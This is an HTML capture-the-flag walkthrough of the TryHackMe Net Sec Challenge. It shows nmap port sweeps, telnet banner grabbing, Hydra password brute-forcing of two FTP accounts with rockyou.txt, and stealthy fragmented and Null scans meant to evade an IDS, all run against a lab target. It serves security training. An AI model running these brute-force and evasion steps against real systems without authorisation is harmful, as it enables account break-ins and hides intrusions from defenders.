<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>TryHackMe – Net Sec Challenge Walkthrough 🚀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; margin: 2rem; color: #111; }
    h1, h2 { margin-top: 1.6rem; }
    code, pre { background: #f6f8fa; border: 1px solid #eaecef; border-radius: 6px; }
    code { padding: 0 .25rem; }
    pre { padding: 1rem; overflow: auto; }
    a { color: #0366d6; text-decoration: none; }
    a:hover { text-decoration: underline; }
    ul { padding-left: 1.25rem; }
    .muted { color: #555; }
  </style>
</head>
<body>

  <h1>TryHackMe – Net Sec Challenge Walkthrough 🚀</h1>
  <p><a href="https://tryhackme.com/room/netsecchallenge">https://tryhackme.com/room/netsecchallenge</a></p>

  <h2>🔍 Reconnaissance</h2>
  <p>I ran a fast full TCP sweep and filtered for open ports:</p>
  <pre><code>nmap -p- --min-rate 10000 &lt;TARGET_IP&gt; | grep open</code></pre>
  <ul>
    <li>🔢 Highest open port under 10,000 → <strong>8080</strong></li>
    <li>🎯 Open port above 10,000 → <strong>10021</strong></li>
    <li>📊 Total open TCP ports → <strong>6</strong></li>
  </ul>

  <h2>🌐 HTTP Server Header Flag</h2>
  <p>Connected via Telnet on port 80 and sent a minimal HTTP request to read headers:</p>
  <pre><code>telnet &lt;TARGET_IP&gt; 80
GET / HTTP/1.1
Host: telnet

</code></pre>
  <p>The <code>Server:</code> header contained the flag 🏁.</p>

  <h2>🔑 SSH Server Header Flag</h2>
  <p>Fetched the SSH banner (includes the flag) by connecting on port 22:</p>
  <pre><code>telnet &lt;TARGET_IP&gt; 22</code></pre>

  <h2>📡 FTP Service Enumeration</h2>
  <p>FTP was hosted on a non-standard port <strong>10021</strong>. The banner exposed the version:</p>
  <pre><code>telnet &lt;TARGET_IP&gt; 10021
# Example banner:
# 220 (vsFTPd 3.0.3)
</code></pre>

  <h2>🔐 FTP Brute Force &amp; User Files</h2>
  <p>Usernames provided: <code>eddie</code> and <code>quinn</code>. Used Hydra with <code>rockyou.txt</code> against port 10021:</p>
  <pre><code>hydra -l eddie -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://&lt;TARGET_IP&gt;
hydra -l quinn -P /usr/share/wordlists/rockyou.txt -s 10021 ftp://&lt;TARGET_IP&gt;</code></pre>
  <p>After finding valid creds, logged in and pulled the file containing the flag:</p>
  <pre><code>ftp &lt;TARGET_IP&gt; 10021
ls
ascii
get &lt;filename&gt;
cat &lt;filename&gt;</code></pre>

  <h2>🕵️ IDS Evasion (Covert Scan)</h2>
  <p>Goal: perform a stealthy Nmap scan to avoid IDS detection.</p>
  <p>Initial attempt (fragmented SYN) showed low detection but filtered ports:</p>
  <pre><code>nmap -sS -T2 -f -p- &lt;TARGET_IP&gt;</code></pre>
  <p>✅ The scan that unlocked the final flag was a <strong>Null scan</strong>:</p>
  <pre><code>nmap -sN &lt;TARGET_IP&gt;</code></pre>
  <p class="muted">Null scans set no TCP flags; ports typically appear as <code>open|filtered</code>, which was sufficient to trigger the room’s final flag 🏁.</p>

  <h2>🏆 Flags Summary</h2>
  <ul>
    <li>🌐 HTTP header → Flag 🏁</li>
    <li>🔑 SSH banner → Flag 🏁</li>
    <li>📡 FTP banner/version → Flag 🏁</li>
    <li>🔐 FTP user file → Flag 🏁</li>
    <li>🕵️ Null scan (<code>-sN</code>) → Final flag 🏁</li>
  </ul>

  <p>✅ Room complete! 🎉</p>

</body>
</html>
